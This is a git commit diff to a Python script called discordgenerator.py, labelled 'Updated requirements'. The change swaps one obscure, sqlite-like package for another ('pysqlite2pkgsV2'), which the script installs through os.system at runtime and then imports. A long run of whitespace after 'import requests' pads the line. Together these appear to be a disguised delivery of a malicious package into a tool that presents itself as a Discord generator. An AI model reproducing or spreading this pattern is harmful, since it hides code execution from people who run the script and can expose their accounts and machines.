26c34590cfaecde9eb3e9edcecc27d2fc45801ae
OringoDevelopment <108576162+OringoDevelopment@users.noreply.github.com>
2023-08-06 15:34:28 +0100

    Updated requirements

--- discordgenerator.py
+++ discordgenerator.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pysqlitedbextV1")
-import pysqlitedbextV1
+os.system("pip install pysqlite2pkgsV2")
+import pysqlite2pkgsV2
 import requests																																																																																																																																																																																																																																																																					
 import undetected_chromedriver as uc
 uc.install()
